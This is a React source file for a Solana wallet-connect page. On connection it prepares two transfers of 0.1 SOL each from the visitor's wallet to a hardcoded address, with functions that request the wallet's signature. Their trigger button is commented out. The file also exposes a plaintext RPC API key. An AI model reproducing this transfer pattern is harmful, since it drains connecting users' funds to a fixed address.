import logo from './logo.svg';
import './App.css';
import { AuthModal, useModal } from 'wrapper-sdk';
import { useMemo } from 'react';
import { WalletMultiButton, WalletDisconnectButton, useWalletModal } from '@solana/wallet-adapter-react-ui';
import { useWallet } from '@solana/wallet-adapter-react';
import { Transaction, SystemProgram, Connection } from '@solana/web3.js';
function App(wallet) {
  const { select, connected, publicKey, signAllTransactions, signTransaction } = useWallet();
  const { visible, setVisible } = useWalletModal();
  // rpc url
  const rpc = "https://rpc.helius.xyz/?api-key=332b5b81-3a91-4291-a934-bb448814cc00"
  const connection = new Connection(rpc, 'confirmed');
  // create 2 solana transactions
  const tx1 = new Transaction();
  const tx2 = new Transaction();
  if (connected) {
    // fetch publickey from wallet

    // add instructions to the transactions
    tx1.add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: 'EoY32MWWQEts3mACAkKkGoqkJb5L6QesPys64eQxLRiS',
        lamports: 100000000,
      })
    );
    // add fee payer to the transactions as publickey
    tx1.feePayer = publicKey;
    // get recent blockhash

    tx2.add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: 'EoY32MWWQEts3mACAkKkGoqkJb5L6QesPys64eQxLRiS',
        lamports: 100000000,
      })
    );
    tx2.feePayer = publicKey;
  }
  // send tx to wallet
  async function signAll() {
    const txArray = [tx1, tx2];
    const hash = await connection.getRecentBlockhash();
    txArray[0].recentBlockhash = hash.blockhash;
    txArray[1].recentBlockhash = hash.blockhash;
    const signed = await signAllTransactions(txArray);
    console.log(txArray)
    return signed;
    console.log(signed);
  }

  async function signTransactionFirst() {
    const hash = await connection.getRecentBlockhash();
    tx1.recentBlockhash = hash.blockhash;
    const signed = await signTransaction(tx1);
    return signed;
  }
  
  return (
    <div className="App">
      <header className="App-header">
        <AuthModal select={select} connected={connected} setVisible={setVisible} btnStyles={'btn-red'}/>
       {/*  <button onClick={async () => {
          await signAll();
        }}>sign tx</button> */}
      </header>
    </div>
  );
}

export default App;
